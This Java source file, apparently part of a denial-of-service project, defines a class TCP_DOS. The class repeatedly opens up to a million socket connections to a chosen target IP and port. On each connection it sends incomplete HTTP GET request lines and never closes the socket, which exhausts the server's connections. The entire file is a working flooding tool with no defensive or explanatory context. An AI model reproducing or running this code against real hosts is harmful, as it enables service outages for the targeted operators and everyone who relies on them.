package dos;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import javax.swing.JOptionPane;

public class TCP_DOS implements Runnable {
    //static DoS _instance = new DoS();

    final String TARGET;
    final int port;

    public TCP_DOS(String ip, String port) {
        System.out.println(ip);
        TARGET = ip;
        //JOptionPane.showMessageDialog(null, port);
        this.port = Integer.parseInt(port);
    }

    /*public static void main(String[] args) {
    for (int i = 0; i < 5; i++)
    new Thread(_instance).start();
    }*/
    public void run() {
        for (int i = 1; i < 1000000; i++) {
            try {
                Socket net = new Socket(TARGET, port); // connects the Socket to
                // the TARGET port 80.
                sendRawLine("GET / HTTP/1.1", net); // Sends the GET /
                // OutputStream
                sendRawLine("Host: " + TARGET, net); // Sends Host: to the
                // OutputStream
                System.out.println("Current Connection: " + i);
            } catch (UnknownHostException e) {
                System.out.println("DDoS.run: " + e);
            } catch (IOException e) {
                System.out.println("DDoS.run: " + e);
            }
        }
    }

    public static void sendRawLine(String text, Socket sock) {
        try {
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(
                    sock.getOutputStream()));
            out.write(text + " ");
            out.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}